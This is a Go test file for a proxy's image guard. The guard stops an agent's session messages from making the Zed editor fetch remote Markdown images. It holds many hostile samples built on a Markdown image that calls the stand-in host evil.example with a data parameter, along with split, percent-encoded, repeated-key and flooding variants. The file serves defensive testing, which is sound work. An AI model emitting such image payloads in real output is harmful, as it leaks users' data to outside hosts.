package acpproxy

import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/url"
	"path"
	"reflect"
	"strings"
	"testing"
)

const evilImage = `![x](https://evil.example/?data=1)`

func encoded(t *testing.T, value map[string]any) string {
	t.Helper()
	line, err := json.Marshal(value)
	if err != nil {
		t.Fatal(err)
	}
	return string(line)
}

// updateLine is a session/update, as a box writes one.
func updateLine(t *testing.T, kind string, members map[string]any) string {
	t.Helper()
	update := map[string]any{"sessionUpdate": kind}
	for name, value := range members {
		update[name] = value
	}
	return encoded(t, map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": "s", "update": update}})
}

func textBlock(text string) map[string]any { return map[string]any{"type": "text", "text": text} }

func messageLine(t *testing.T, text string) string {
	t.Helper()
	return updateLine(t, "agent_message_chunk", map[string]any{"content": textBlock(text)})
}

func linkLine(t *testing.T, uri string) string {
	t.Helper()
	return updateLine(t, "agent_message_chunk", map[string]any{"content": map[string]any{"type": "resource_link", "name": "n", "uri": uri}})
}

const turnAnswer = `{"jsonrpc":"2.0","id":3,"result":{"stopReason":"end_turn"}}`

// zedMarkdown lists the Markdown documents Zed builds from these lines, read from its source at v1.26.2:
// a message's chunks and text blocks join into one, a resource link joins as `[@name](uri)` or the bare
// uri, a raw tool value that is not a string is printed as JSON in a fence, and every other string stands alone.
func zedMarkdown(t *testing.T, lines []byte) []string {
	t.Helper()
	joined := map[string]string{}
	var documents []string
	var collect func(path string, value any)
	collect = func(path string, value any) {
		switch value := value.(type) {
		case string:
			documents = append(documents, value)
		case []any:
			for _, item := range value {
				if block, isBlock := item.(map[string]any); isBlock && block["type"] == "text" {
					joined[path] += block["text"].(string)
				} else {
					collect(path, item)
				}
			}
		case map[string]any:
			for name, member := range value {
				_, isString := member.(string)
				if (name == "rawInput" || name == "rawOutput") && !isString {
					var printed bytes.Buffer
					encoder := json.NewEncoder(&printed)
					encoder.SetEscapeHTML(false)
					encoder.SetIndent("", "  ")
					if err := encoder.Encode(member); err != nil {
						t.Fatal(err)
					}
					documents = append(documents, "```json\n"+printed.String()+"```")
				} else {
					collect(path+"/"+name, member)
				}
			}
		}
	}
	for _, line := range bytes.SplitAfter(lines, []byte("\n")) {
		var message map[string]any
		if json.Unmarshal(line, &message) != nil {
			continue
		}
		params, _ := message["params"].(map[string]any)
		update, _ := params["update"].(map[string]any)
		if update == nil {
			collect("", message)
			continue
		}
		stream, _ := update["sessionUpdate"].(string)
		if id, named := update["messageId"].(string); named && stream == "session_message_chunk" {
			stream += id
		}
		if id, named := update["compactionId"].(string); named {
			stream = "compaction " + id
		}
		if id, named := update["toolCallId"].(string); named {
			stream = "tool " + id
		}
		if summary, listed := update["summary"]; listed {
			collect(stream, summary)
			delete(update, "summary")
		}
		switch content := update["content"].(type) {
		case map[string]any:
			if inner, wrapped := content["content"].(map[string]any); wrapped {
				content = inner
			}
			if uri, isLink := content["uri"].(string); isLink {
				joined[stream] += zedLink(uri)
			} else if resource, isResource := content["resource"].(map[string]any); isResource {
				joined[stream] += zedLink(resource["uri"].(string))
				documents = append(documents, resource["text"].(string))
			} else if text, isText := content["text"].(string); isText {
				joined[stream] += text
			}
			delete(update, "content")
		case []any:
			for _, item := range content {
				block, _ := item.(map[string]any)
				if inner, wrapped := block["content"].(map[string]any); wrapped {
					joined[stream], _ = inner["text"].(string) // a tool's block stands alone, until a chunk adds to the last; an image is not Markdown
				} else if text, isText := block["text"].(string); isText {
					joined[stream] += text
				}
			}
			delete(update, "content")
		}
		collect("", update)
	}
	for _, document := range joined {
		documents = append(documents, document)
	}
	return documents
}

func zedLink(uri string) string {
	parsed, err := url.Parse(uri)
	if err != nil || parsed.Scheme == "" {
		return uri
	}
	switch name := parsed.Query().Get("symbol"); {
	case parsed.Scheme == "http" || parsed.Scheme == "https":
		return "[@" + uri + "](" + uri + ")"
	case name != "":
		return "[@" + name + "](" + uri + ")"
	}
	return "[@" + path.Base(parsed.Path) + "](" + uri + ")"
}

func fetches(t *testing.T, lines []byte) []string {
	t.Helper()
	var images []string
	for _, document := range zedMarkdown(t, lines) {
		images = append(images, loadedImages(t, document)...)
	}
	return images
}

// throughGuard writes lines one by one, as the proxy does, and ends what is held as a dead child does.
func throughGuard(t *testing.T, lines ...string) []byte {
	t.Helper()
	var editor bytes.Buffer
	guard := newImageGuard(&editor)
	for _, line := range lines {
		if _, err := guard.Write([]byte(line + "\n")); err != nil {
			t.Fatal(err)
		}
	}
	guard.flush()
	return editor.Bytes()
}

// A reopened thread's start message comes straight after a replay, which may have ended on what the
// guard holds. That goes first, and the message's links stay links.
func TestStartMessageAfterAReplayPassesTheGuard(t *testing.T) {
	notice := messageLine(t, "\n\n**Open the box's port in your browser**\n\n- Port 5173 → [localhost:42858](http://localhost:42858)\n\n")
	out := throughGuard(t, messageLine(t, "the end!"), `{"jsonrpc":"2.0","id":7,"result":{"configOptions":[]}}`, notice)
	text := string(out)
	answer := strings.Index(text, `"id":7`)
	held := strings.LastIndex(text[:max(answer, 0)], `!`)
	link := strings.Index(text, "[localhost:42858](http://localhost:42858)")
	if answer < 0 || held < 0 || link < answer {
		t.Fatalf("held text, then the answer, then the whole link, got:\n%s", out)
	}
}

func TestNoLineMakesTheEditorFetchAnImage(t *testing.T) {
	escapedID := strings.Repeat("i", maxStreamID+1)
	tool := func(kind string) map[string]any { return map[string]any{"toolCallId": "t", "kind": kind} }
	with := func(base map[string]any, name string, value any) map[string]any {
		base[name] = value
		return base
	}
	for name, lines := range map[string][]string{
		"a message":                {messageLine(t, evilImage)},
		"a project path":           {messageLine(t, "![x](evil.png)")},
		"a path cut in two":        {messageLine(t, "![x](ev"), messageLine(t, "il.png)")},
		"a path after half data":   {messageLine(t, "![x](data:"), messageLine(t, "a)")},
		"a path definition":        {messageLine(t, "[x]: evil.png\n\n![x]")},
		"a path definition cut":    {messageLine(t, "![x]\n\n[x"), messageLine(t, "]: evil.png")},
		"a definition's path, cut": {messageLine(t, "![x]\n\n[x]: ev"), messageLine(t, "il.png")},
		"a path after the answer":  {messageLine(t, "![x]\n\n[x"), turnAnswer, messageLine(t, "]: evil.png")},
		"a colon after the answer": {messageLine(t, "![x]\n\n[x]"), turnAnswer, messageLine(t, ": evil.png")},
		"a path after a colon":     {messageLine(t, "![x]\n\n[x]:"), turnAnswer, messageLine(t, " evil.png")},
		"a new line in a new text": {messageLine(t, "![x]\n\n"), turnAnswer, messageLine(t, "[x]: evil.png")},
		"a list item, then a path": {messageLine(t, "![x]\n\n- "), turnAnswer, messageLine(t, "[x]: evil.png")},
		"a name that defines":      {messageLine(t, "![@a]\n\n"), linkLine(t, "file:///a%5D%3Aevil.png")},
		"two writes":               {messageLine(t, "![x](https:"), messageLine(t, "//evil.example/)")},
		"the `!` alone":            {messageLine(t, "!"), messageLine(t, "[x](https://evil.example/)")},
		"the `]` alone":            {messageLine(t, "![x]"), messageLine(t, "(https://evil.example/)")},
		"a definition cut":         {messageLine(t, "![x]\n\n[x]"), messageLine(t, ": https://evil.example/")},
		"a thought":                {updateLine(t, "agent_thought_chunk", map[string]any{"content": textBlock("!")}), updateLine(t, "agent_thought_chunk", map[string]any{"content": textBlock("[x](https://evil.example/)")})},
		"a user message on replay": {updateLine(t, "user_message_chunk", map[string]any{"content": textBlock("!")}), updateLine(t, "user_message_chunk", map[string]any{"content": textBlock("[x](https://evil.example/)")})},
		"a session message":        {updateLine(t, "session_message_chunk", map[string]any{"messageId": "m", "content": textBlock("!")}), updateLine(t, "session_message_chunk", map[string]any{"messageId": "m", "content": textBlock("[x](https://evil.example/)")})},
		// Zed joins a chunk with no id onto one with an id, and the other way round.
		"an id, then none": {updateLine(t, "agent_message_chunk", map[string]any{"messageId": "m", "content": textBlock("!")}), messageLine(t, "[x](https://evil.example/)")},
		"no id, then one":  {messageLine(t, "!"), updateLine(t, "agent_message_chunk", map[string]any{"messageId": "m", "content": textBlock("[x](https://evil.example/)")})},
		// Nothing stops a box from writing after its turn, and Zed adds that to the same message.
		"after the turn's answer":    {messageLine(t, "!"), turnAnswer, messageLine(t, "[x](https://evil.example/)")},
		"after a bracket":            {messageLine(t, "![x]"), turnAnswer, messageLine(t, "(https://evil.example/)")},
		"after a definition's label": {messageLine(t, "![x]\n\n[x]"), turnAnswer, messageLine(t, ": https://evil.example/")},
		"after a colon":              {messageLine(t, "![x]\n\n[x]:"), turnAnswer, messageLine(t, " https://evil.example/")},
		"after half an image":        {messageLine(t, "![x"), turnAnswer, messageLine(t, "](https://evil.example/)")},
		"after other streams":        {messageLine(t, "!"), turnAnswer, updateLine(t, "agent_thought_chunk", map[string]any{"content": textBlock("hm")}), messageLine(t, "[x](https://evil.example/)")},
		"id after id, and back": {updateLine(t, "session_message_chunk", map[string]any{"messageId": "a", "content": textBlock("!")}), turnAnswer,
			updateLine(t, "session_message_chunk", map[string]any{"messageId": "b", "content": textBlock("hm")}), updateLine(t, "session_message_chunk", map[string]any{"messageId": "a", "content": textBlock("[x](https://evil.example/)")})},
		"an id too long to remember": {updateLine(t, "agent_message_chunk", map[string]any{"messageId": escapedID, "content": textBlock("!")}), updateLine(t, "agent_message_chunk", map[string]any{"messageId": escapedID, "content": textBlock("[x](https://evil.example/)")})},
		"a tool's title":             {updateLine(t, "tool_call", with(tool("other"), "title", evilImage))},
		"a tool's title, later":      {updateLine(t, "tool_call_update", with(tool("other"), "title", "![x]\n\n[x]: https://evil.example/"))},
		"a command's title":          {updateLine(t, "tool_call", with(tool("execute"), "title", evilImage))},
		"a tool's text":              {updateLine(t, "tool_call", with(tool("read"), "content", []any{map[string]any{"type": "content", "content": textBlock(evilImage)}}))},
		"a tool's streamed text":     {updateLine(t, "tool_call_content_chunk", map[string]any{"toolCallId": "t", "content": map[string]any{"type": "content", "content": textBlock("!")}}), updateLine(t, "tool_call_content_chunk", map[string]any{"toolCallId": "t", "content": map[string]any{"type": "content", "content": textBlock("[x](https://evil.example/)")}})},
		"a chunk after a tool's text": {updateLine(t, "tool_call", with(tool("read"), "content", []any{map[string]any{"type": "content", "content": textBlock("!")}})),
			updateLine(t, "tool_call_content_chunk", map[string]any{"toolCallId": "t", "content": map[string]any{"type": "content", "content": textBlock("[x](https://evil.example/)")}})},
		"a raw input":             {updateLine(t, "tool_call", with(tool("other"), "rawInput", evilImage))},
		"a raw output":            {updateLine(t, "tool_call_update", with(tool("other"), "rawOutput", evilImage))},
		"a plan":                  {updateLine(t, "plan", map[string]any{"entries": []any{map[string]any{"content": evilImage, "priority": "high", "status": "pending"}}})},
		"a notice":                {updateLine(t, "notice", map[string]any{"severity": "info", "message": evilImage})},
		"a command's description": {updateLine(t, "available_commands_update", map[string]any{"availableCommands": []any{map[string]any{"name": "c", "description": evilImage}}})},
		"a permission question": {encoded(t, map[string]any{"jsonrpc": "2.0", "id": 9, "method": "session/request_permission", "params": map[string]any{"sessionId": "s",
			"toolCall": map[string]any{"toolCallId": "t", "title": evilImage, "rawInput": map[string]any{"a": evilImage}}, "options": []any{map[string]any{"optionId": "o", "name": evilImage, "kind": "allow_once"}}}})},
		"a form question": {encoded(t, map[string]any{"jsonrpc": "2.0", "id": 9, "method": "elicitation/create", "params": map[string]any{"sessionId": "s", "mode": "form", "message": evilImage,
			"requestedSchema": map[string]any{"type": "object", "properties": map[string]any{"a": map[string]any{"type": "string", "description": evilImage}}}}})},
		"an error":                     {`{"jsonrpc":"2.0","id":3,"error":{"code":-32000,"message":"` + evilImage + `"}}`},
		"an error's data":              {`{"jsonrpc":"2.0","id":3,"error":{"code":-32000,"message":"no","data":{"description":"` + evilImage + `"}}}`},
		"a line Coop builds":           {string(bytes.TrimSpace(SessionMessageLine("s", evilImage)))},
		"Coop's error":                 {string(bytes.TrimSpace(targetErrorResponse("3", evilImage)))},
		"a link's bare text":           {linkLine(t, evilImage)},
		"a link's name":                {linkLine(t, "file:///a?symbol=%21%5Bx%5D%28https%3A%2F%2Fevil.example%2F%29#L1")},
		"a definition's name":          {messageLine(t, "![x]\n\n"), linkLine(t, "file:///a?symbol=%0A%0A%5Bx%5D%3A%20https%3A%2F%2Fevil.example%2F%0A%0A#L1")},
		"a link after a `!`":           {messageLine(t, "!"), linkLine(t, "https://evil.example/")},
		"a bare link ending in `!`":    {linkLine(t, "foo!"), messageLine(t, "[x](https://evil.example/)")},
		"a bare link ending in `]`":    {messageLine(t, "!"), linkLine(t, "[x]"), messageLine(t, "(https://evil.example/)")},
		"a bare link ending in `]:`":   {messageLine(t, "![x]\n\n"), linkLine(t, "[x]:"), messageLine(t, " https://evil.example/")},
		"a bare link ending in a `\\`": {linkLine(t, `foo\`), messageLine(t, `\`+evilImage)},
		"a link after a pause":         {messageLine(t, "!"), turnAnswer, linkLine(t, "https://evil.example/")},
		"a link after half an image":   {messageLine(t, "![x"), linkLine(t, "file:///a"), messageLine(t, "](https://evil.example/)")},
		"a user's resource":            {updateLine(t, "user_message_chunk", map[string]any{"content": map[string]any{"type": "resource", "resource": map[string]any{"uri": "file:///a?symbol=%21%5Bx%5D%28https%3A%2F%2Fevil.example%2F%29#L1", "text": "t"}}})},
		"a resource's text":            {updateLine(t, "agent_message_chunk", map[string]any{"content": map[string]any{"type": "resource", "resource": map[string]any{"uri": "file:///a", "mimeType": "text/markdown", "text": evilImage}}})},
		"a message's blocks":           {updateLine(t, "session_message", map[string]any{"messageId": "m", "content": []any{textBlock("!"), textBlock("[x](https://evil.example/)")}})},
		"a summary, then more": {updateLine(t, "compaction_update", map[string]any{"compactionId": "c", "status": "in_progress", "summary": []any{textBlock("!")}}),
			updateLine(t, "compaction_summary_chunk", map[string]any{"compactionId": "c", "content": textBlock("[x](https://evil.example/)")})},
		"metadata":    {updateLine(t, "agent_message_chunk", map[string]any{"content": textBlock("hello "), "_meta": map[string]any{"a": evilImage}})},
		"another key": {updateLine(t, "something_new", map[string]any{"body": evilImage})},
	} {
		t.Run(name, func(t *testing.T) {
			all := []byte(strings.Join(lines, "\n") + "\n")
			if len(fetches(t, all)) == 0 {
				t.Fatalf("without the guard this fetches nothing, so it proves nothing:\n%s\n%q", all, zedMarkdown(t, all))
			}
			got := throughGuard(t, lines...)
			if images := fetches(t, got); len(images) > 0 {
				t.Errorf("the editor fetches %v from:\n%s", images, got)
			}
			if !bytes.HasSuffix(got, []byte("\n")) && len(got) > 0 {
				t.Errorf("a rewritten line lost its ending, which hangs the session: %q", got)
			}
		})
	}
}

func TestALinkThatSpellsAnImageGoesNowhere(t *testing.T) {
	for uri, spells := range map[string]bool{
		"file:///a/b.rs#L1":        false,
		"https://example.org/?a=b": false,
		"file:///a/b%20c.rs":       false,
		"file:///a/b!":             true,
		"foo:[x]:":                 true,
		`foo\`:                     true,
		"file:///[::1]:8080/a":     true,
		"file:///a%5D%3Aevil.png":  true,
		"file:///a/%5Bb%5D.rs":     false,
		"https://evil.example/![x": true,
		"file:///a?symbol=%21%5Bx%5D%28https%3A%2F%2Fevil.example%2F%29#L1":   true,
		"file:///a?symbol=%zz%21%5Bx%5D%28https%3A%2F%2Fevil.example%2F%29":   true,
		"file:///a?symbol=%0A%5Bx%5D%3A%20https%3A%2F%2Fevil.example%2F%0A#L": true,
		"%":   false,
		"%2":  false,
		"%21": true,
	} {
		if spellsImage(uri) != spells {
			t.Errorf("spellsImage(%q) = %v", uri, !spells)
		}
	}
}

// An image block may name where its image came from. Zed shows only a block's data, but another editor
// may fetch the address, and the docs promise a filtered session shows an image only from its data. So the
// address never goes out: a block with data keeps the data, and one with nothing else becomes a link.
func TestAnImageBlockKeepsNoAddress(t *testing.T) {
	const remote = "https://evil.example/?data=1"
	const data = "iVBORw0KGgo="
	image := func(members map[string]any) map[string]any {
		members["type"] = "image"
		return members
	}
	asLink := func(address string) map[string]any { return textBlock("[image](" + address + ")") }
	// A block sits in a message's content, or in the list of content a tool call holds.
	places := map[string]struct {
		line    func(block map[string]any) string
		blockIn func(update map[string]any) map[string]any
	}{
		"a message": {
			func(block map[string]any) string {
				return updateLine(t, "agent_message_chunk", map[string]any{"messageId": "m", "content": block})
			},
			func(update map[string]any) map[string]any { return update["content"].(map[string]any) },
		},
		"a tool's content": {
			func(block map[string]any) string {
				return updateLine(t, "tool_call_update", map[string]any{"toolCallId": "t", "content": []any{map[string]any{"type": "content", "content": block}}})
			},
			func(update map[string]any) map[string]any {
				return update["content"].([]any)[0].(map[string]any)["content"].(map[string]any)
			},
		},
	}
	for name, tc := range map[string]struct{ block, want map[string]any }{
		"an address and empty data": {image(map[string]any{"data": "", "mimeType": "image/png", "uri": remote}), asLink(remote)},
		"an address and no data":    {image(map[string]any{"mimeType": "image/png", "uri": remote}), asLink(remote)},
		"data and an address": {image(map[string]any{"data": data, "mimeType": "image/png", "uri": remote}),
			image(map[string]any{"data": data, "mimeType": "image/png"})},
		"a project path": {image(map[string]any{"data": "", "mimeType": "image/png", "uri": "file:///private/tmp/a b.png"}),
			asLink("file:///private/tmp/a%20b.png")},
		"an address that ends the link and starts an image": {image(map[string]any{"uri": "x)![y](https://evil.example/?d=1"}),
			asLink("x%29![y]%28https://evil.example/?d=1")},
	} {
		for place, at := range places {
			t.Run(name+" in "+place, func(t *testing.T) {
				out := throughGuard(t, at.line(tc.block))
				var message struct {
					Params struct{ Update map[string]any }
				}
				if err := json.Unmarshal(bytes.TrimSpace(out), &message); err != nil {
					t.Fatalf("the editor got %q", out)
				}
				if got := at.blockIn(message.Params.Update); !reflect.DeepEqual(got, tc.want) {
					t.Errorf("the editor got %v, want %v", got, tc.want)
				}
				if images := fetches(t, out); len(images) > 0 {
					t.Errorf("the editor fetches %v from %s", images, out)
				}
			})
		}
	}
	// The link joins the message right after what came before it, so a `!` that was sent as it was (the turn
	// ended on it) must not turn the link into an image.
	t.Run("a link after a `!`", func(t *testing.T) {
		out := throughGuard(t, messageLine(t, "look!"), turnAnswer, updateLine(t, "agent_message_chunk", map[string]any{"content": image(map[string]any{"data": "", "uri": remote})}))
		if images := fetches(t, out); len(images) > 0 {
			t.Errorf("the editor fetches %v from:\n%s", images, out)
		}
	})
	// An image that keeps its data is no link, so the `!` before it needs no backslash.
	t.Run("data after a `!`", func(t *testing.T) {
		out := throughGuard(t, messageLine(t, "look!"), turnAnswer, updateLine(t, "agent_message_chunk", map[string]any{"content": image(map[string]any{"data": data, "mimeType": "image/png", "uri": remote})}))
		if bytes.Contains(out, []byte(`"text":"\\"`)) {
			t.Errorf("a stray backslash reached the editor:\n%s", out)
		}
	})
}

// A parser that keeps the first copy of a key would show what a check of the last one never saw.
func TestALineWithARepeatedKeyGoesNowhere(t *testing.T) {
	for _, line := range []string{
		`{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s","update":{"sessionUpdate":"agent_message_chunk","content":{"type":"text","text":"` + evilImage + `","text":"ok"}}}}`,
		`{"jsonrpc":"2.0","method":"session/update","params":{"sessionId":"s","update":{"sessionUpdate":"plan","entries":[{"content":"ok","content":"` + evilImage + `"}]}}}`,
	} {
		if got := throughGuard(t, line); len(got) != 0 {
			t.Errorf("the editor got %s", got)
		}
	}
}

// A box picks every id, so memory has a limit, and what is forgotten must not open anything.
func TestABoxCannotFloodTheGuardIntoForgetting(t *testing.T) {
	var editor bytes.Buffer
	guard := newImageGuard(&editor)
	write := func(line string) {
		t.Helper()
		if _, err := guard.Write([]byte(line + "\n")); err != nil {
			t.Fatal(err)
		}
	}
	write(messageLine(t, "!"))
	write(turnAnswer)
	for i := 0; i < 3*maxStreams; i++ {
		write(encoded(t, map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": fmt.Sprintf("s%d", i),
			"update": map[string]any{"sessionUpdate": "agent_message_chunk", "messageId": "m", "content": textBlock("!")}}}))
		write(encoded(t, map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": fmt.Sprintf("s%d", i),
			"update": map[string]any{"sessionUpdate": "agent_thought_chunk", "content": textBlock("hm")}}}))
	}
	if len(guard.open) > maxStreams || len(guard.exposed) > maxStreams {
		t.Errorf("%d open and %d exposed streams", len(guard.open), len(guard.exposed))
	}
	write(turnAnswer)
	write(messageLine(t, "[x](https://evil.example/)"))
	guard.flush()
	if images := fetches(t, editor.Bytes()); len(images) > 0 {
		t.Errorf("the editor fetches %v", images)
	}
}

// What an agent really sends must reach the editor as it was written, including what looks like an image
// in places Zed does not read as Markdown.
func TestWhatAnAdapterSendsGoesOutByteForByte(t *testing.T) {
	var editor bytes.Buffer
	guard := newImageGuard(&editor)
	for _, line := range []string{
		updateLine(t, "agent_message_chunk", map[string]any{"messageId": "m", "content": textBlock("```rust\nlet v = vec![1, 2];\n```\n")}),
		updateLine(t, "agent_thought_chunk", map[string]any{"content": textBlock("#!/bin/sh and a[0]: b\n")}),
		// Zed drops a user chunk that equals what it shows already, so this one cannot wait for more.
		updateLine(t, "user_message_chunk", map[string]any{"content": textBlock("Fix it!")}),
		updateLine(t, "tool_call", map[string]any{"toolCallId": "t", "title": "Read `a[0]`!", "kind": "read", "rawInput": map[string]any{"path": "/a", "n": 1.5}, "locations": []any{map[string]any{"path": "/a/b!"}}}),
		updateLine(t, "tool_call_update", map[string]any{"toolCallId": "t", "status": "completed", "content": []any{map[string]any{"type": "content", "content": textBlock("All good! [1, 2]")}}}),
		updateLine(t, "tool_call_update", map[string]any{"toolCallId": "t", "content": []any{map[string]any{"type": "diff", "path": "/a/README.md", "oldText": "", "newText": evilImage}}}),
		updateLine(t, "tool_call_update", map[string]any{"toolCallId": "t", "_meta": map[string]any{"terminal_output": map[string]any{"terminal_id": "t", "data": evilImage}}}),
		updateLine(t, "plan", map[string]any{"entries": []any{map[string]any{"content": "Ship it!", "priority": "high", "status": "pending"}}}),
		updateLine(t, "usage_update", map[string]any{"used": 12345678901234567890.0, "size": 1}),
		updateLine(t, "agent_message_chunk", map[string]any{"content": map[string]any{"type": "resource_link", "name": "b.rs", "uri": "file:///a/b.rs#L1"}}),
		updateLine(t, "agent_message_chunk", map[string]any{"content": map[string]any{"type": "image", "mimeType": "image/png", "data": "AAAA"}}),
		`{"jsonrpc":"2.0","id":9,"method":"session/request_permission","params":{"sessionId":"s","toolCall":{"toolCallId":"t","title":"Run!"},"options":[]}}`,
		`{"jsonrpc":"2.0","id":3,"result":{"stopReason":"end_turn","big":12345678901234567890,"small":1.50}}`,
		`{"jsonrpc":"2.0","id":4,"error":{"code":-32000,"message":"no such thing!"}}`,
	} {
		editor.Reset()
		if _, err := guard.Write([]byte(line + "\n")); err != nil {
			t.Fatal(err)
		}
		if got := editor.String(); got != line+"\n" {
			t.Errorf("the editor got %q\n       instead of %q", got, line+"\n")
		}
	}
}

// Zed prints these as JSON in a fence. Code in them must stay as it is, and nothing in a string gets out.
func TestARawValueStaysInItsFence(t *testing.T) {
	for _, value := range []any{
		map[string]any{"code": "let v = vec![1, 2];"},
		map[string]any{"a": evilImage},
		map[string]any{evilImage: 1},
		[]any{"```", "\n```\n" + evilImage + "\n```\n"},
		map[string]any{"a": "![x", "b": "](https://evil.example/)"},
	} {
		line := updateLine(t, "tool_call", map[string]any{"toolCallId": "t", "title": "t", "rawInput": value})
		got := throughGuard(t, line)
		if string(got) != line+"\n" {
			t.Errorf("the editor got %s", got)
		}
		if images := fetches(t, got); len(images) > 0 {
			t.Errorf("the editor fetches %v from %s", images, got)
		}
	}
}

func TestFilteredSessionHoldsBackOnlyWhatCouldBeAnImage(t *testing.T) {
	h := newProxyHarnessWith(t, 2, nil, RunOpts{NoEditorHostAccess: true, RestrictedNetwork: true})
	h.initialize(0)
	h.newSession(0, "s")
	said := func(line []byte) string {
		t.Helper()
		var message struct {
			Params struct {
				Update struct {
					Content struct{ Text string } `json:"content"`
				} `json:"update"`
			} `json:"params"`
		}
		if err := json.Unmarshal(line, &message); err != nil {
			t.Fatalf("%v: %s", err, line)
		}
		if !bytes.HasSuffix(line, []byte("\n")) {
			t.Errorf("this line lost its ending, which hangs the session: %q", line)
		}
		return message.Params.Update.Content.Text
	}
	child := h.children[0].outW

	t.Run("an image in two writes", func(t *testing.T) {
		writeLine(t, child, messageLine(t, "See ![x"))
		if got := said(readLine(t, h.clientOut)); got != "See " {
			t.Fatalf("the editor got %q before the image could be read", got)
		}
		writeLine(t, child, messageLine(t, "](https://evil.example/) now"))
		if got := said(readLine(t, h.clientOut)); got != `\![x](https://evil.example/) now` {
			t.Fatalf("the editor got %q", got)
		}
	})
	t.Run("a `!` comes out before the turn's answer", func(t *testing.T) {
		writeLine(t, child, messageLine(t, "Done!"))
		if got := said(readLine(t, h.clientOut)); got != "Done" {
			t.Fatalf("the editor got %q", got)
		}
		writeLine(t, child, turnAnswer)
		if got := said(readLine(t, h.clientOut)); got != "!" {
			t.Fatalf("the editor got %q, want the held `!` first", got)
		}
		if got := strings.TrimSpace(string(readLine(t, h.clientOut))); got != turnAnswer {
			t.Fatalf("the editor got %s, want the answer", got)
		}
		// The box may go on, and Zed adds this to the same message.
		writeLine(t, child, messageLine(t, "[x](https://evil.example/)"))
		if got := said(readLine(t, h.clientOut)); got != `\[x](https://evil.example/)` {
			t.Fatalf("the editor got %q", got)
		}
	})
	t.Run("a `!` comes out before a tool call", func(t *testing.T) {
		writeLine(t, child, messageLine(t, "Done!"))
		readLine(t, h.clientOut)
		call := updateLine(t, "tool_call", map[string]any{"toolCallId": "t", "title": "Read"})
		writeLine(t, child, call)
		if got := said(readLine(t, h.clientOut)); got != "!" {
			t.Fatalf("the editor got %q, want the held `!` first", got)
		}
		if got := strings.TrimSpace(string(readLine(t, h.clientOut))); got != call {
			t.Fatalf("the editor got %s", got)
		}
	})
	t.Run("what is held does not hold back another session", func(t *testing.T) {
		writeLine(t, child, messageLine(t, "Done!"))
		readLine(t, h.clientOut)
		other := encoded(t, map[string]any{"jsonrpc": "2.0", "method": "session/update", "params": map[string]any{"sessionId": "other", "update": map[string]any{"sessionUpdate": "usage_update", "used": 1}}})
		writeLine(t, child, other)
		if got := strings.TrimSpace(string(readLine(t, h.clientOut))); got != other {
			t.Fatalf("the editor got %s, want the other session's line", got)
		}
	})
	t.Run("a `!` comes out when the child goes", func(t *testing.T) {
		_ = child.Close()
		if got := said(readLine(t, h.clientOut)); got != "!" {
			t.Fatalf("the editor got %q, want the `!` the last child left", got)
		}
	})
	_ = h.shutdown()
}

// Coop writes a box's words into its own lines too, past the last write of a box's line.
func TestAFailedSettingCannotCarryAnImage(t *testing.T) {
	modelID := InjectPrefix + "model"
	h := newProxyHarnessWith(t, 1, &Hooks{SessionReady: func(sid string) [][]byte {
		return [][]byte{[]byte(fmt.Sprintf(`{"jsonrpc":"2.0","id":%q,"method":"session/set_config_option","params":{"sessionId":%q,"configId":"model","value":"bad"}}`+"\n", modelID, sid))}
	}}, RunOpts{NoEditorHostAccess: true, RestrictedNetwork: true})
	c := h.children[0]
	writeLine(t, h.clientIn, `{"jsonrpc":"2.0","id":2,"method":"session/new","params":{"cwd":"/w"}}`)
	readLine(t, h.childIn[0])
	wrote := writeLineAsync(c.outW, `{"jsonrpc":"2.0","id":2,"result":{"sessionId":"s"}}`)
	readLine(t, h.childIn[0]) // the model setting
	if err := <-wrote; err != nil {
		t.Fatal(err)
	}
	readLine(t, h.clientOut)
	writeLine(t, h.clientIn, `{"jsonrpc":"2.0","id":3,"method":"session/prompt","params":{"sessionId":"s","prompt":[]}}`)
	writeLine(t, c.outW, fmt.Sprintf(`{"jsonrpc":"2.0","id":%q,"error":{"code":-32602,"message":%q}}`, modelID, evilImage))
	answer := readLine(t, h.clientOut)
	if !strings.Contains(string(answer), "could not be applied") {
		t.Fatalf("the editor got %s", answer)
	}
	if images := fetches(t, answer); len(images) > 0 {
		t.Errorf("the editor fetches %v from %s", images, answer)
	}
	_ = h.shutdown()
}
